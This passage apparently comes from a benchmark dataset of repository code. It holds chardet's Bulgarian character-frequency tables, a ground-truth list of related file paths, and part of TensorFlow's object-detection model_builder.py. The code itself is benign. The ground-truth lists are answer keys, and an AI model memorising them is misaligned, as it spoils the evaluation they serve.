97,113,196,197,198,199,200,253,253,253,253,253,\n206,207,208,209,210,211,212,213,120,214,215,216,217,218,219,220,\n221, 78, 64, 83,121, 98,117,105,222,223,224,225,226,227,228,229,\n 88,230,231,232,233,122, 89,106,234,235,236,237,238, 45,239,240,\n 73, 80,118,114,241,242,243,244,245, 62, 58,246,247,248,249,250,\n 31, 32, 35, 43, 37, 44, 55, 47, 40, 59, 33, 46, 38, 36, 41, 30,\n 39, 28, 34, 51, 48, 49, 53, 50, 54, 57, 61,251, 67,252, 60, 56,\n  1, 18,  9, 20, 11,  3, 23, 15,  2, 26, 12, 10, 14,  6,  4, 13,\n  7,  8,  5, 19, 29, 25, 22, 21, 27, 24, 17, 75, 52,253, 42, 16,\n)\n\n\n\n\n\n\n\nBulgarianLangModel = (\n0,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,3,3,3,3,3,3,3,2,3,3,3,3,3,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,2,2,1,2,2,\n3,1,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,0,3,3,3,3,3,3,3,3,3,3,0,3,0,1,\n0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,2,3,2,3,3,3,3,3,3,3,3,0,3,1,0,\n0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,2,3,3,2,3,3,3,3,3,3,3,3,3,3,3,3,1,3,2,3,3,3,3,3,3,3,3,0,3,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,3,3,3,3,3,3,2,3,2,2,1,3,3,3,3,2,2,2,1,1,2,0,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,2,3,2,2,3,3,1,1,2,3,3,2,3,3,3,3,2,1,2,0,2,0,3,0,0,\n0,0,0,0,0,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,1,3,3,3,3,3,2,3,2,3,3,3,3,3,2,3,3,1,3,0,3,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,1,3,3,2,3,3,3,1,3,3,2,3,2,2,2,0,0,2,0,2,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,0,3,3,3,2,2,3,3,3,1,2,2,3,2,1,1,2,0,2,0,0,0,0,\n1,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,2,3,3,1,2,3,2,2,2,3,3,3,3,3,2,2,3,1,2,0,2,1,2,0,0,\n0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,1,3,3,3,3,3,2,3,3,3,2,3,3,2,3,2,2,2,3,1,2,0,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,1,1,1,2,2,1,3,1,3,2,2,3,0,0,1,0,1,0,1,0,0,\n0,0,0,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,2,2,3,2,2,3,1,2,1,1,1,2,3,1,3,1,2,2,0,1,1,1,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,1,3,2,2,3,3,1,2,3,1,1,3,3,3,3,1,2,2,1,1,1,0,2,0,2,0,1,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,1,2,2,3,3,3,2,2,1,1,2,0,2,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,0,1,2,1,3,3,2,3,3,3,3,3,2,3,2,1,0,3,1,2,1,2,1,2,3,2,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,1,1,2,3,3,3,3,3,3,3,3,3,3,3,3,0,0,3,1,3,3,2,3,3,2,2,2,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,0,3,3,3,3,3,2,1,1,2,1,3,3,0,3,1,1,1,1,3,2,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,2,2,2,3,3,3,3,3,3,3,3,3,3,3,1,1,3,1,3,3,2,3,2,2,2,3,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,2,3,3,2,2,3,2,1,1,1,1,1,3,1,3,1,1,0,0,0,1,0,0,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,3,2,3,2,0,3,2,0,3,0,2,0,0,2,1,3,1,0,0,1,0,0,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,2,1,1,1,1,2,1,1,2,1,1,1,2,2,1,2,1,1,1,0,1,1,0,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,2,1,3,1,1,2,1,3,2,1,1,0,1,2,3,2,1,1,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,3,3,3,3,2,2,1,0,1,0,0,1,0,0,0,2,1,0,3,0,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,2,3,2,3,3,1,3,2,1,1,1,2,1,1,2,1,3,0,1,0,0,0,1,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,1,1,2,2,3,3,2,3,2,2,2,3,1,2,2,1,1,2,1,1,2,2,0,1,1,0,1,0,2,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,3,3,3,2,1,3,1,0,2,2,1,3,2,1,0,0,2,0,2,0,1,0,0,0,0,0,0,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,\n3,3,3,3,3,3,1,2,0,2,3,1,2,3,2,0,1,3,1,2,1,1,1,0,0,1,0,0,2,2,2,3,\n2,2,2,2,1,2,1,1,2,2,1,1,2,0,1,1,1,0,0,1,1,0,0,1,1,0,0,0,1,1,0,1,\n3,3,3,3,3,2,1,2,2,1,2,0,2,0,1,0,1,2,1,2,1,1,0,0,0,1,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,1,\n3,3,2,3,3,1,1,3,1,0,3,2,1,0,0,0,1,2,0,2,0,1,0,0,0,1,0,1,2,1,2,2,\n1,1,1,1,1,1,1,2,2,2,1,1,1,1,1,1,1,0,1,2,1,1,1,0,0,0,0,0,1,1,0,0,\n3,1,0,1,0,2,3,2,2,2,3,2,2,2,2,2,1,0,2,1,2,1,1,1,0,1,2,1,2,2,2,1,\n1,1,2,2,2,2,1,2,1,1,0,1,2,1,2,2,2,1,1,1,0,1,1,1,1,2,0,1,0,0,0,0,\n2,3,2,3,3,0,0,2,1,0,2,1,0,0,0,0,2,3,0,2,0,0,0,0,0,1,0,0,2,0,1,2,\n2,1,2,1,2,2,1,1,1,2,1,1,1,0,1,2,2,1,1,1,1,1,0,1,1,1,0,0,1,2,0,0,\n3,3,2,2,3,0,2,3,1,1,2,0,0,0,1,0,0,2,0,2,0,0,0,1,0,1,0,1,2,0,2,2,\n1,1,1,1,2,1,0,1,2,2,2,1,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,1,0,0,\n2,3,2,3,3,0,0,3,0,1,1,0,1,0,0,0,2,2,1,2,0,0,0,0,0,0,0,0,2,0,1,2,\n2,2,1,1,1,1,1,2,2,2,1,0,2,0,1,0,1,0,0,1,0,1,0,0,1,0,0,0,0,1,0,0,\n3,3,3,3,2,2,2,2,2,0,2,1,1,1,1,2,1,2,1,1,0,2,0,1,0,1,0,0,2,0,1,2,\n1,1,1,1,1,1,1,2,2,1,1,0,2,0,1,0,2,0,0,1,1,1,0,0,2,0,0,0,1,1,0,0,\n2,3,3,3,3,1,0,0,0,0,0,0,0,0,0,0,2,0,0,1,1,0,0,0,0,0,0,1,2,0,1,2,\n2,2,2,1,1,2,1,1,2,2,2,1,2,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,1,1,0,0,\n2,3,3,3,3,0,2,2,0,2,1,0,0,0,1,1,1,2,0,2,0,0,0,3,0,0,0,0,2,0,2,2,\n1,1,1,2,1,2,1,1,2,2,2,1,2,0,1,1,1,0,1,1,1,1,0,2,1,0,0,0,1,1,0,0,\n2,3,3,3,3,0,2,1,0,0,2,0,0,0,0,0,1,2,0,2,0,0,0,0,0,0,0,0,2,0,1,2,\n1,1,1,2,1,1,1,1,2,2,2,0,1,0,1,1,1,0,0,1,1,1,0,0,1,0,0,0,0,1,0,0,\n3,3,2,2,3,0,1,0,1,0,0,0,0,0,0,0,1,1,0,3,0,0,0,0,0,0,0,0,1,0,2,2,\n1,1,1,1,1,2,1,1,2,2,1,2,2,1,0,1,1,1,1,1,0,1,0,0,1,0,0,0,1,1,0,0,\n3,1,0,1,0,2,2,2,2,3,2,1,1,1,2,3,0,0,1,0,2,1,1,0,1,1,1,1,2,1,1,1,\n1,2,2,1,2,1,2,2,1,1,0,1,2,1,2,2,1,1,1,0,0,1,1,1,2,1,0,1,0,0,0,0,\n2,1,0,1,0,3,1,2,2,2,2,1,2,2,1,1,1,0,2,1,2,2,1,1,2,1,1,0,2,1,1,1,\n1,2,2,2,2,2,2,2,1,2,0,1,1,0,2,1,1,1,1,1,0,0,1,1,1,1,0,1,0,0,0,0,\n2,1,1,1,1,2,2,2,2,1,2,2,2,1,2,2,1,1,2,1,2,3,2,2,1,1,1,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,3,2,0,1,2,0,1,2,1,1,0,1,0,1,2,1,2,0,0,0,1,1,0,0,0,1,0,0,2,\n1,1,0,0,1,1,0,1,1,1,1,0,2,0,1,1,1,0,0,1,1,0,0,0,0,1,0,0,0,1,0,0,\n2,0,0,0,0,1,2,2,2,2,2,2,2,1,2,1,1,1,1,1,1,1,0,1,1,1,1,1,2,1,1,1,\n1,2,2,2,2,1,1,2,1,2,1,1,1,0,2,1,2,1,1,1,0,2,1,1,1,1,0,1,0,0,0,0,\n3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,\n1,1,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,3,2,0,0,0,0,1,0,0,0,0,0,0,1,1,0,2,0,0,0,0,0,0,0,0,1,0,1,2,\n1,1,1,1,1,1,0,0,2,2,2,2,2,0,1,1,0,1,1,1,1,1,0,0,1,0,0,0,1,1,0,1,\n2,3,1,2,1,0,1,1,0,2,2,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,1,0,1,2,\n1,1,1,1,2,1,1,1,1,1,1,1,1,0,1,1,0,1,0,1,0,1,0,0,1,0,0,0,0,1,0,0,\n2,2,2,2,2,0,0,2,0,0,2,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,2,0,2,2,\n1,1,1,1,1,0,0,1,2,1,1,0,1,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,2,0,0,2,0,1,1,0,0,0,1,0,0,2,0,2,0,0,0,0,0,0,0,0,0,0,1,1,\n0,0,0,1,1,1,1,1,1,1,1,1,1,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,3,2,0,0,1,0,0,1,0,0,0,0,0,0,1,0,2,0,0,0,1,0,0,0,0,0,0,0,2,\n1,1,0,0,1,0,0,0,1,1,0,0,1,0,1,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n2,1,2,2,2,1,2,1,2,2,1,1,2,1,1,1,0,1,1,1,1,2,0,1,0,1,1,1,1,0,1,1,\n1,1,2,1,1,1,1,1,1,0,0,1,2,1,1,1,1,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,\n1,0,0,1,3,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,2,1,0,0,1,0,2,0,0,0,0,0,1,1,1,0,1,0,0,0,0,0,0,0,0,2,0,0,1,\n0,2,0,1,0,0,1,1,2,0,1,0,1,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,\n1,2,2,2,2,0,1,1,0,2,1,0,1,1,1,0,0,1,0,2,0,1,0,0,0,0,0,0,0,0,0,1,\n0,1,0,0,1,0,0,0,1,1,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,2,2,0,0,1,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,\n0,1,0,1,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,\n2,0,1,0,0,1,2,1,1,1,1,1,1,2,2,1,0,0,1,0,1,0,0,0,0,1,1,1,1,0,0,0,\n1,1,2,1,1,1,1,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,1,2,1,0,0,1,0,0,0,0,0,0,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,1,\n0,0,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,\n0,1,1,0,1,1,1,0,0,1,0,0,1,0,1,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,\n1,0,1,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,1,0,2,0,0,2,0,1,0,0,1,0,0,1,\n1,1,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,\n1,1,1,1,1,1,1,2,0,0,0,0,0,0,2,1,0,1,1,0,0,1,1,1,0,1,0,0,0,0,0,0,\n2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,1,0,1,1,1,1,1,0,1,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n)\n\nLatin5BulgarianModel = {\n  'charToOrderMap': Latin5_BulgarianCharToOrderMap,\n  'precedenceMatrix': BulgarianLangModel,\n  'mTypicalPositiveRatio': 0.969392,\n  'keepEnglishLetter': False,\n  'charsetName': \"ISO-8859-5\"\n}\n\nWin1251BulgarianModel = {\n  'charToOrderMap': win1251BulgarianCharToOrderMap,\n  'precedenceMatrix': BulgarianLangModel,\n  'mTypicalPositiveRatio': 0.969392,\n  'keepEnglishLetter': False,\n  'charsetName': \"windows-1251\"\n}\n\n\n\n",
        "gt": [
            "'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/langbulgarianmodel.py'",
            "'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/sbcsgroupprober.py'",
            "'pocscan/pocscan/plugins/tangscan/tangscan/thirdparty/requests/packages/chardet/universaldetector.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/chardetect.py'"
        ]
    },
    {
        "files": [
            "'CastAi/research/object_detection/builders/model_builder.py'",
            "'CastAi/research/object_detection/eval.py'",
            "'CastAi/research/object_detection/builders/losses_builder.py'"
        ],
        "content": "'CastAi/research/object_detection/builders/model_builder.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom object_detection.builders import anchor_generator_builder\nfrom object_detection.builders import box_coder_builder\nfrom object_detection.builders import box_predictor_builder\nfrom object_detection.builders import hyperparams_builder\nfrom object_detection.builders import image_resizer_builder\nfrom object_detection.builders import losses_builder\nfrom object_detection.builders import matcher_builder\nfrom object_detection.builders import post_processing_builder\nfrom object_detection.builders import region_similarity_calculator_builder as sim_calc\nfrom object_detection.core import box_predictor\nfrom object_detection.meta_architectures import faster_rcnn_meta_arch\nfrom object_detection.meta_architectures import rfcn_meta_arch\nfrom object_detection.meta_architectures import ssd_meta_arch\nfrom object_detection.models import faster_rcnn_inception_resnet_v2_feature_extractor as frcnn_inc_res\nfrom object_detection.models import faster_rcnn_inception_v2_feature_extractor as frcnn_inc_v2\nfrom object_detection.models import faster_rcnn_nas_feature_extractor as frcnn_nas\nfrom object_detection.models import faster_rcnn_pnas_feature_extractor as frcnn_pnas\nfrom object_detection.models import faster_rcnn_resnet_v1_feature_extractor as frcnn_resnet_v1\nfrom object_detection.models import ssd_resnet_v1_fpn_feature_extractor as ssd_resnet_v1_fpn\nfrom object_detection.models.embedded_ssd_mobilenet_v1_feature_extractor import EmbeddedSSDMobileNetV1FeatureExtractor\nfrom object_detection.models.ssd_inception_v2_feature_extractor import SSDInceptionV2FeatureExtractor\nfrom object_detection.models.ssd_inception_v3_feature_extractor import SSDInceptionV3FeatureExtractor\nfrom object_detection.models.ssd_mobilenet_v1_feature_extractor import SSDMobileNetV1FeatureExtractor\nfrom object_detection.models.ssd_mobilenet_v2_feature_extractor import SSDMobileNetV2FeatureExtractor\nfrom object_detection.protos import model_pb2\n\n\nSSD_FEATURE_EXTRACTOR_CLASS_MAP = {\n    'ssd_inception_v2': SSDInceptionV2FeatureExtractor,\n    'ssd_inception_v3': SSDInceptionV3FeatureExtractor,\n    'ssd_mobilenet_v1': SSDMobileNetV1FeatureExtractor,\n    'ssd_mobilenet_v2': SSDMobileNetV2FeatureExtractor,\n    'ssd_resnet50_v1_fpn': ssd_resnet_v1_fpn.SSDResnet50V1FpnFeatureExtractor,\n    'ssd_resnet101_v1_fpn': ssd_resnet_v1_fpn.SSDResnet101V1FpnFeatureExtractor,\n    'ssd_resnet152_v1_fpn': ssd_resnet_v1_fpn.SSDResnet152V1FpnFeatureExtractor,\n    'embedded_ssd_mobilenet_v1': EmbeddedSSDMobileNetV1FeatureExtractor,\n}\n\n\nFASTER_RCNN_FEATURE_EXTRACTOR_CLASS_MAP = {\n    'faster_rcnn_nas':\n    frcnn_nas.FasterRCNNNASFeatureExtractor,\n    'faster_rcnn_pnas':\n    frcnn_pnas.FasterRCNNPNASFeatureExtractor,\n    'faster_rcnn_inception_resnet_v2':\n    frcnn_inc_res.FasterRCNNInceptionResnetV2FeatureExtractor,\n    'faster_rcnn_inception_v2':\n    frcnn_inc_v2.FasterRCNNInceptionV2FeatureExtractor,\n    'faster_rcnn_resnet50':\n    frcnn_resnet_v1.FasterRCNNResnet50FeatureExtractor,\n    'faster_rcnn_resnet101':\n    frcnn_resnet_v1.FasterRCNNResnet101FeatureExtractor,\n    'faster_rcnn_resnet152':\n    frcnn_resnet_v1.FasterRCNNResnet152FeatureExtractor,\n}\n\n\ndef build(model_config, is_training, add_summaries=True):\n\n  if not isinstance(model_config, model_pb2.DetectionModel):\n    raise ValueError('model_config not of type model_pb2.DetectionModel.')\n  meta_architecture = model_config.WhichOneof('model')\n  if meta_architecture == 'ssd':\n    return _build_ssd_model(model_config.ssd, is_training, add_summaries)\n  if meta_architecture == 'faster_rcnn':\n    return _build_faster_rcnn_model(model_config.faster_rcnn, is_training,\n                                    add_summaries)\n  raise ValueError('Unknown meta architecture: {}'.format(meta_architecture))\n\n\ndef _build_ssd_feature_extractor(feature_extractor_config, is_training,\n                                 reuse_weights=None,\n                                 inplace_batchnorm_update=False):\n\n  feature_type = feature_extractor_config.type\n  depth_multiplier = feature_extractor_config.depth_multiplier\n  min_depth = feature_extractor_config.min_depth\n  pad_to_multiple = feature_extractor_config.pad_to_multiple\n  batch_norm_trainable = feature_extractor_config.batch_norm_trainable\n  use_explicit_padding = feature_extractor_config.use_explicit_padding\n  use_depthwise = feature_extractor_config.use_depthwise\n  conv_hyperparams = hyperparams_builder.build(\n      feature_extractor_config.conv_hyperparams, is_training)\n\n  if feature_type not in SSD_FEATURE_EXTRACTOR_CLASS_MAP:\n    raise ValueError('Unknown ssd feature_extractor: {}'.format(feature_type))\n\n  feature_extractor_class = SSD_FEATURE_EXTRACTOR_CLASS_MAP[feature_type]\n  return feature_extractor_class(is_training, depth_multiplier, min_depth,\n                                 pad_to_multiple, conv_hyperparams,\n                                 batch_norm_trainable, reuse_weights,\n                                 use_explicit_padding, use_depthwise,\n                                 inplace_batchnorm_update)\n\n\ndef _build_ssd_model(ssd_config, is_training, add_summaries):\n\n  num_classes = ssd_config.num_classes\n\n\n  feature_extractor = _build_ssd_feature_extractor(\n      feature_extractor_config=ssd_config.feature_extractor,\n      is_training=is_training,\n      inplace_batchnorm_update=ssd_config.inplace_batchnorm_update)\n\n  box_coder = box_coder_builder.build(ssd_config.box_coder)\n  matcher = matcher_builder.build(ssd_config.matcher)\n  region_similarity_calculator = sim_calc.build(\n      ssd_config.similarity_calculator)\n  encode_background_as_zeros = ssd_config.encode_background_as_zeros\n  negative_class_weight = ssd_config.negative_class_weight\n  ssd_box_predictor = box_predictor_builder.build(hyperparams_builder.build,\n                                                  ssd_config.box_predictor,\n                                                  is_training, num_classes)\n  anchor_generator = anchor_generator_builder.build(\n      ssd_config.anchor_generator)\n  image_resizer_fn = image_resizer_builder.build(ssd_config.image_resizer)\n  non_max_suppression_fn, score_conversion_fn = post_processing_builder.build(\n      ssd_config.post_processing)\n  (classification_loss, localization_loss, classification_weight,\n   localization_weight,\n   hard_example_miner) = losses_builder.build(ssd_config.loss)\n  normalize_loss_by_num_matches = ssd_config.normalize_loss_by_num_matches\n  normalize_loc_loss_by_codesize = ssd_config.normalize_loc_loss_by_codesize\n\n  return ssd_meta_arch.SSDMetaArch(\n      is_training,\n      anchor_generator,\n      ssd_box_predictor,\n      box_coder,\n      feature_extractor,\n      matcher,\n      region_similarity_calculator,\n      encode_background_as_zeros,\n      negative_class_weight,\n      image_resizer_fn,\n      non_max_suppression_fn,\n      score_conversion_fn,\n      classification_loss,\n      localization_loss,\n      classification_weight,\n      localization_weight,\n      normalize_loss_by_num_matches,\n      hard_example_miner,\n      add_summaries=add_summaries,\n      normalize_loc_loss_by_codesize=normalize_loc_loss_by_codesize)\n\n\ndef _build_faster_rcnn_feature_extractor(\n    feature_extractor_config, is_training, reuse_weights=None,\n    inplace_batchnorm_update=False):\n\n  if inplace_batchnorm_update:\n    raise ValueError('inplace batchnorm updates not supported.')\n  feature_type = feature_extractor_config.type\n  first_stage_features_stride = (\n      feature_extractor_config.first_stage_features_stride)\n  batch_norm_trainable = feature_extractor_config.batch_norm_trainable\n\n  if feature_type not in FASTER_RCNN_FEATURE_EXTRACTOR_CLASS_MAP:\n    raise ValueError('Unknown Faster R-CNN feature_extractor: {}'.format(\n        feature_type))\n  feature_extractor_class = FASTER_RCNN_FEATURE_EXTRACTOR_CLASS_MAP[\n      feature_type]\n  return feature_extractor_class(\n      is_training, first_stage_features_stride,\n      batch_norm_trainable, reuse_weights)\n\n\ndef _build_faster_rcnn_model(frcnn_config, is_training, add_summaries):\n\n  num_classes = frcnn_config.num_classes\n  image_resizer_fn = image_resizer_builder.build(frcnn_config.image_resizer)\n\n  feature_extractor = _build_faster_rcnn_feature_extractor(\n      frcnn_config.feature_extractor, is_training,\n      frcnn_config.inplace_batchnorm_update)\n\n  number_of_stages = frcnn_config.number_of_stages\n  first_stage_anchor_generator = anchor_generator_builder.build(\n      frcnn_config.first_stage_anchor_generator)\n\n  first_stage_atrous_rate = frcnn_config.first_stage_atrous_rate\n  first_stage_box_predictor_arg_scope = hyperparams_builder.build(\n      frcnn_config.first_stage_box_predictor_conv_hyperparams, is_training)\n  first_stage_box_predictor_kernel_size = (\n      frcnn_config.first_stage_box_predictor_kernel_size)\n  first_stage_box_predictor_depth = frcnn_config.first_stage_box_predictor_depth\n  first_stage_minibatch_size = frcnn_config.first_stage_minibatch_size\n  first_stage_positive_balance_fraction = (\n      frcnn_config.first_stage_positive_balance_fraction)\n  first_stage_nms_score_threshold = frcnn_config.first_stage_nms_score_threshold\n  first_stage_nms_iou_threshold = frcnn_config.first_stage_nms_iou_threshold\n  first_stage_max_proposals = frcnn_config.first_stage_max_proposals\n  first_stage_loc_loss_weight = (\n      frcnn_config.first_stage_localization_loss_weight)\n  first_stage_obj_loss_weight = frcnn_config.first_stage_objectness_loss_weight\n\n  initial_crop_size = frcnn_config.initial_crop_size\n  maxpool_kernel_size = frcnn_config.maxpool_kernel_size\n  maxpool_stride = frcnn_config.maxpool_stride\n\n  second_stage_box_predictor = box_predictor_builder.build(\n      hyperparams_builder.build,\n      frcnn_config.second_stage_box_predictor,\n      is_training=is_training,\n      num_classes=num_classes)\n  second_stage_batch_size = frcnn_config.second_stage_batch_size\n  second_stage_balance_fraction = frcnn_config.second_stage_balance_fraction\n  (second_stage_non_max_suppression_fn, second_stage_score_conversion_fn\n  ) = post_processing_builder.build(frcnn_config.second_stage_post_processing)\n  second_stage_localization_loss_weight = (\n      frcnn_config.second_stage_localization_loss_weight)\n  second_stage_classification_loss = (\n      losses_builder.build_faster_rcnn_classification_loss(\n          frcnn_config.second_stage_classification_loss))\n  second_stage_classification_loss_weight = (\n      frcnn_config.second_stage_classification_loss_weight)\n  second_stage_mask_prediction_loss_weight = (\n      frcnn_config.second_stage_mask_prediction_loss_weight)\n\n  hard_example_miner = None\n  if frcnn_config.HasField('hard_example_miner'):\n    hard_example_miner = losses_builder.build_hard_example_miner(\n        frcnn_config.hard_example_miner,\n        second_stage_classification_loss_weight,\n        second_stage_localization_loss_weight)\n\n  common_kwargs = {\n      'is_training': is_training,\n      'num_classes': num_classes,\n      'image_resizer_fn': image_resizer_fn,\n      'feature_extractor': feature_extractor,\n      'number_of_stages': number_of_stages,\n      'first_stage_anchor_generator': first_stage_anchor_generator,\n      'first_stage_atrous_rate': first_stage_atrous_rate,\n      'first_stage_box_predictor_arg_scope':\n      first_stage_box_predictor_arg_scope,\n      'first_stage_box_predictor_kernel_size':\n      first_stage_box_predictor_kernel_size,\n      'first_stage_box_predictor_depth': first_stage_box_predictor_depth,\n      'first_stage_minibatch_size': first_stage_minibatch_size,\n      'first_stage_positive_balance_fraction':\n      first_stage_positive_balance_fraction,\n      'first_stage_nms_score_threshold': first_stage_nms_score_threshold,\n      'first_stage_nms_iou_threshold': first_stage_nms_iou_threshold,\n      'first_stage_max_proposals': first_stage_max_proposals,\n      'first_stage_localization_loss_weight': first_stage_loc_loss_weight,\n      'first_stage_objectness_loss_weight': first_stage_obj_loss_weight,\n      'second_stage_batch_size': second_stage_batch_size,\n      